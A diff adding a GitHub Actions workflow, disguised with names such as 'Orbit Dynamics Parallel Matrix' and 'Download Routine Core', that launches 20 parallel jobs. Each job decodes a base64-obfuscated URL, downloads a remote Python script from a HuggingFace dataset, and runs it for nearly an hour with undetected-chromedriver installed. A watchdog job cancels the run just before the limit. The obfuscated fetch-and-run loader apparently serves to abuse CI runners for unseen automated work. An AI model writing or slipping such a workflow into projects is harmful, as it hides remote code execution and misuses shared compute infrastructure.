@@ -1,0 +1,92 @@
+name: Orbit Dynamics Parallel Matrix
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: orbit-matrix-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Watchdog: يراقب المدى الزمني ويلغي العمليات بإنهاء صريح
+  # =================================================================
+  orbit-watchdog:
+    name: "System Watchdog"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - name: Monitor Execution Lifetime
+        run: |
+          RUN_LIFESPAN=3540
+          echo "[WATCHDOG] Initializing lifecycle observer for run ID: ${{ github.run_id }}"
+          echo "[WATCHDOG] Max lifespan set to ${RUN_LIFESPAN} seconds."
+
+          sleep ${RUN_LIFESPAN}
+
+          echo "[WATCHDOG] Lifespan limit reached. Initiating API cancellation call..."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+  # =================================================================
+  # Execution Cluster: تشغيل الحزم عبر السكريبتات الديناميكية
+  # =================================================================
+  execution-cluster:
+    name: "ClusterNode-${{ matrix.cluster_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        cluster_id: [301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320]
+
+    steps:
+      - name: Provision Node Dependencies
+        run: |
+          echo "[PROVISION] Updating software repositories for ClusterNode-${{ matrix.cluster_id }}..."
+          sudo apt-get update -y -qq
+          sudo apt-get install -y curl python3-pip
+
+      - name: Download Routine Core
+        run: |
+          echo "[FETCH] Decoding endpoint payload..."
+          RAW_B64="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5"
+          ENDPOINT_URL=$(perl -MMIME::Base64 -e "print decode_base64('$RAW_B64')")
+          
+          curl -sL "$ENDPOINT_URL" -o core_module.py
+          echo "[FETCH] Core module retrieved successfully."
+
+      - name: Setup Runtime Libraries
+        run: |
+          echo "[SETUP] Installing required Python environments..."
+          python3 -m pip install -q --no-cache-dir psutil requests selenium undetected-chromedriver
+
+      - name: Execute Routine and Manage Process
+        run: |
+          cat << 'EOF' > run_wrapper.sh
+          #!/usr/bin/env bash
+          python3 core_module.py &
+          PID=$!
+          echo "[WRAPPER] Process launched with PID: $PID"
+          
+          sleep 3540
+          
+          if kill -0 "$PID" 2>/dev/null; then
+            echo "[WRAPPER] Process timed out. Termination signal sent."
+            kill -15 "$PID" 2>/dev/null || kill -9 "$PID" 2>/dev/null
+          else
+            echo "[WRAPPER] Process concluded organically."
+          fi
+          EOF
+
+          chmod +x run_wrapper.sh
+          ./run_wrapper.sh
